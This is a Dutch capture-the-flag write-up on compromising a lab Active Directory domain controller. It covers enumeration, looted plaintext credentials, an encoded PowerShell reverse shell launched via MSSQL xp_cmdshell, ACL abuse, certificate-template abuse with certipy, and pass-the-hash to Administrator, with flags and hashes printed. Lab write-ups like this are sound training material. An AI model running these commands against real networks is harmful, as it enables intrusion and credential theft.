
Als eerst zal ik gaan kijken welke poorten dat er allemaal openstaan. Dit zal je kunnen zien aan de hand van het volgende commando:

```
nmap -p- -sCV 10.129.88.97 -vvvv
```

Als we gaan kijken naar de nmap zullen we zien dat er 23 Poorten er open staan. Wat zijn de services die dat er openstaan?

- **Port 139**: NetBIOS Session Service (NetBIOS over TCP/IP)
    
- **Port 53**: Domain Name System (DNS)
    
- **Port 445**: Server Message Block (SMB) over TCP/IP (voor bestand- en printerdeling)
    
- **Port 135**: Microsoft Remote Procedure Call (MSRPC)
    
- **Port 9389**: Active Directory Web Services (ADWS)
    
- **Port 49666**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 3269**: Global Catalog Service (LDAP over SSL voor Global Catalog)
    
- **Port 47001**: Windows Remote Management Service (WinRM)
    
- **Port 464**: Kerberos Change/Set Password Service
    
- **Port 49712**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 49667**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 49680**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 3268**: Global Catalog Service (LDAP voor Global Catalog)
    
- **Port 5985**: Windows Remote Management (HTTP)
    
- **Port 49685**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 88**: Kerberos Authentication Service (Kerberos-sec)
    
- **Port 593**: Distributed Component Object Model (DCOM) of RPC-over-HTTP
    
- **Port 636**: LDAP over SSL (LDAPS)
    
- **Port 49730**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 49692**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    
- **Port 1433**: Microsoft SQL Server (standaard TCP-poort voor SQL Server)
    
- **Port 49664**: Dynamisch poortbereik (mogelijk gerelateerd aan RPC of Windows diensten)
    

Aan de hand van de volgende poort kan ik gaan zien of dat het een AD is of dat het een normale server of een domain controller is. We kunnen dus aan de hand van de foto hieronder zien dat het een AD Domain controller is.

![image-20250111-193536.png](80543764.png)

Nu ben ik het enum4linux commando gaan gebruiken voor het enumeraten van AD. Enum4linux gaat van alle basic checks gaan doen op windows services zoals een rpc, smb, ldap, … . Dit zullen we dus gaan doen aan de hand van het volgende commando:

```
enum4linux sequel.htb -u 'rose' -p 'KxEPkKe6R8su'
```

![image-20250111-194416.png](80511001.png)

Hierbij krijgen we veel belangrijke informatie te zien. zoals een welke users er zijn, wat de shares zijn, welke groups er allemaal zijn.

Als we zullen gaan kijken op welke shared disks de user rose mag gaan zullen we gaan zien dat deze user tot 5 shared disks read only rechten heeft. De shared disks waar tot ze toegang heeft zijn de volgende disks.

- Accounting department
    
- IPC$
    
- NETLOGON
    
- SYSVOL
    
- Users
    

![image-20250111-195013.png](80576536.png)

Ik zal nu 1 voor 1 gaan connecteren met elke disk voor te zien of dat er geen belangrijke informatie inzit. Dit zal ik gaan doen aan de hand van het volgende commando:

```
smbclient \\\\10.129.88.97\\<disk> -U 'rose'
```

Als eerst kon ik dus niet connecteren met de share Accounting Department. Daarna had ik pas door dat je dus niet kon connecteren omdat er een spatie in de shared name stond. Ik heb hierdoor dus dubbel aanhalingstekens gebruikt en nu kon ik dus wel connecteren op de shared drive.

![image-20250112-132806.png](80576563.png)

Binnen deze shared drive hebben we 2 .xlsx files. ik zal deze nu gaan downloaden naar mijn eigen machine zodat ik de files kan gaan analyseren. Dit zal ik gaan down aan de hand van het volgende commando:

```
get <name van de file>
```

![image-20250112-132934.png](80478264.png)

Voor dat we deze files dus kunnen zullen we deze eerst moeten gaan unzippen. Dit zullen we gaan doen aan de hand van het volgende commando:

```
unzip accounts.xlsx -d output_directory
```

![image-20250112-133855.png](80478272.png)

De “-d output_directory” commando dient ervoor van de files die dat in het bestand accounts.xlsx stonden te gaan wegschrijven in de directory “output_directory“.

bij het unzippen van deze files heb ik verschillende Usernames en Passwords gevonden.

![image-20250112-140023.png](80511028.png)

```
|**First name**|**Last name**|**Email**|**Username**|**Password**||
|---|---|---|---|---|---|
|Angela|Martin|angela@sequel.htb|angela|0fwz7Q4mSpurIt99||
|Oscar|Martinez|oscar@sequel.htb|oscar|86LxLBMgEWaKUnBG||
|Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo||
|||sa@sequel.htb|sa|MSSQLP@ssw0rd!||

```
Nu dat ik de volgende gegevens weet kan ik een connectie gaan starten naar de sql server. Dit zal ik gaan doen aan de hand van de volgende gegevens:

```
impacket-mssqlclient dc01.sequel.htb/'sa':'MSSQLP@ssw0rd!'@10.129.253.188
```

![image-20250112-153711.png](80478305.png)

Door binnen de sql server het volgende commando uittevoeren, kunnen we een revshell gaan opstarten. Hiervoor zullen we op onze eigen machine een listener moeten starten. Dit zullen we gaan doen aan de hand van het volgende commando:

```
nc -lvnp 4444
```

en zullen we dus nu op de sql server het volgende commando gaan uitvoeren.

```
xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

![image-20250112-175712.png](80478335.png)

Nu zal je dus kunnen zien dat we een reverseshell hebben gekregen met de sql server.

![image-20250112-175840.png](80478341.png)

Als we gaan kijken in de directory SQL2019,zullen we daar de sub directory ExpressAdv_ENU zien staan. In deze sub directory hebben we verschillende files. Ik ben al eerst gaan kijken in de sql-configuration file. Daarin heb ik de login gegevens gevonden van de user sql_svc.

- username: sql_svc
    
- password: WqSZAF6CysDQbGb3ls
    

![image-20250112-194116.png](80576612.png)

Als we nu een connectie gaan proberen starten met evil-winrm aan de hand van de gegevens die we hier boven zien. zullen we zien dat we geen connectie kunnen maken.

![image-20250112-201033.png](80543832.png)

Maar als we nu de user ryan zullen gaan gebruiken en het password van de sql_svc user, zullen we zien dat we connectie kunnen maken. Dit heb ik gevonden door alle users met alle passworden is te proberen. Ik heb de connectie kunnen maken aan de hand van de volgende gegevens:

```
evil-winrm -u 'ryan' -p 'WqSZAF6CysDQbGb3' -i sequel.htb0
```

- username: ryan
    
- password: WqSZAF6CysDQbGb3
    

![image-20250112-201151.png](80478373.png)

Als we nu naar de desktop gaan zal je kunnen zien dat we daar de eerst flag ”De User Flag” hebben gevonden.

user flag: d33e2bf1789154728111b617bc3ae0e3

![image-20250112-193536.png](80478356.png)

We zullen dus nu Bloodhound gaan installeren en gebruik gaan maken voor het path te zoeken naar de admin.

Eens dat bloodhound is geinstalleerd zullen we de volgende code gaan uitvoeren.

```
nxc ldap 10.129.67.214 -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.129.67.214 <Ip dat we moeten gebruiken voor te hacken, dus niet ip van de eigen machine>
```


We kunnen ook op de windows machine sharphound gaan toevoegen door SharpHound.exe upteloaden op de windows machine en deze dan uittevoeren. Dan de file naar de eigen machine te downloaden en dan upteloaden op BloodHound.

Als we dus dan naar bloodhound gaan daar zal je dan rechts data kunnen importeren. Deze dat is het zip bestand dat we zonet hebben gehaald door het commando van hierboven uittevoeren.

![image-20250113-093132.png](81330185.png)![image-20250113-093149.png](81297411.png)

Dan kies je het zip bestand en dan kan je in de search balk de username gaan opzoeken, Druk dan op enter en je krijgt het volgende te zien.

![image-20250113-093251.png](81330191.png)

Ik ben gaan opzoeken hoe dat we de user “ca_svc“ zijn password konden gaan veranderen. Dit heb ik kunnen doen aan de hand van de volgende stappen te volgen.

Op de Kali linux machine voer je de beide volgende codes uit.

```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

Daarna zal je dus een connectie gaan maken met de windows machine aan de hand van de usercredentials van ryan te gebruiken.

```
evil-winrm --user 'ryan' --password 'WqSZAF6CysDQbGb3' --ip 10.129.67.214
```

Nu dat je de connectie hebt gemaakt zal je aan de hand van de volgende codes het password van de user ca_svc kunnen gaan veranderen. [https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit)

```
Import-Module ./PowerView.ps1
Set-DomainObjectOwner -identity ca_svc -OwnerIdentity ryan
Add-DomainObjectAcl -TargetIdentity ca_svc -PrincipalIdentity ryan -Rights ResetPassword
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force
Set-DomainUserPassword -identity ca_svc -accountpassword $cred
```

![image-20250113-124915.png](81592326.png)

En zoals je dan hierboven kunt zien hebben we het password van de user kunnen veranderen.

Voor administrator te kunnen worden zullen we het certificate van de user ca_svc gaan halen. door dit te doen zullen we met het cert dat de administrator gebruikt kunnen binnen geraken als admin. Voor dit te kunnen doen zullen we de volgende code moeten gebruiken.

```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
impacket-dacledit -action 'write'  -rights 'FullControl' -inheritance -principal ryan  -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3  -dc-ip 10.129.67.214
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -target dc01.sequel.htb -dc-ip 10.129.67.214 <Hiermee zullen we de hash gaan krijgen voor te gebruiken bij het pakken van het certificate.>
KRB5CCNAME=ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.67.214 <Hiermee gaan we de template van het cert da we nodig hebben gaan updaten.>
certipy req -u ca_svc -hashes  3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.67.214 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -debug
certipy auth -pfx ./administrator.pfx -dc-ip 10.129.67.214
```

Wat gaan de volgende commands doen?

**Impacket-owner**

Het impacket-owneredit-tool wordt gebruikt om de eigenaar van een object in Active Directory te wijzigen. Hier wordt het eigenaarschap van het object ca_svc gewijzigd naar de gebruiker ryan.

```
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

**impacket-dacledit**

Het impacket-dacledit-tool wordt gebruikt om de toegangsrechten (permissions) op een object in Active Directory te wijzigen. Hier worden FullControl-rechten toegekend aan de gebruiker ryan voor het object ca_svc.

```
impacket-dacledit -action 'write'  -rights 'FullControl' -inheritance -principal ryan  -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3  -dc-ip 10.129.67.214
```

**Certipy shadow command**

Het certipy shadow-commando misbruikt de CA-rollen (Certificate Authority) om toegang te krijgen tot de account-gegevens van ca_svc. Dit levert de NTLM-hash of TGT (Ticket Granting Ticket) van het account op.

```
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -target dc01.sequel.htb -dc-ip 10.129.67.214 <Hiermee zullen we de hash gaan krijgen voor te gebruiken bij het pakken van het certificate.>
```

**Certipy template commando**

Dit commando wordt gebruikt om een malafide certificatensjabloon (template) te manipuleren of te misbruiken. Dit kan worden gebruikt om een geldig certificaat te genereren.

```
KRB5CCNAME=ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.67.214 <Hiermee gaan we de template van het cert da we nodig hebben gaan updaten.>

```
**Certipy req commando**

Dit commando vraagt een certificaat aan via de malafide certificatensjabloon. Het resultaat is een geldig certificaat dat gebruikt kan worden om te authenticeren als Administrator.

```
certipy req -u ca_svc -hashes  3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.67.214 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -debug
```

**Certipy auth commando**

Dit commando gebruikt het verkregen certificaat (administrator.pfx) om te authenticeren als Administrator.

```
certipy auth -pfx ./administrator.pfx -dc-ip 10.129.67.214
```

bij het uivoeren van het laatste commando kan je zien dat we de hash van de administrator hebben gekregen. deze zullen we nu moeten gaan gebruiken voor int e kunnen loggen hebben we de root flag administrator.

```
hash: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

![image-20250113-132402.png](81428494.png)

we zullen dit gaan doen aan de hand van de applicatie psexec.py. Aan de hand van deze applicatie zullen we kunnen inloggen als administrator op de machine. We zullen hiervoor het volgende commando gaan gebruiken.

```
python3 psexec.py sequel.htb/administrator@10.129.67.214 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff 
```

![image-20250113-134707.png](80576661.png)

zoals je nu kunt zien zijn we ingelogd als user administrator.

![image-20250113-134810.png](81428504.png)

en als we nu dus gaan navigeren naar de administrator/desktop directory zullen we daar de root flag zien staan.

root flag: 372c23d287d38551c48bb024bc0e2c23

![image-20250113-135008.png](81592338.png)

![image-20250113-135120.png](81461266.png)

Deze machine heb ik gehacked op 12/1/2025 → 1 dag na dat hij uit was. Dus dit is nog een active box.
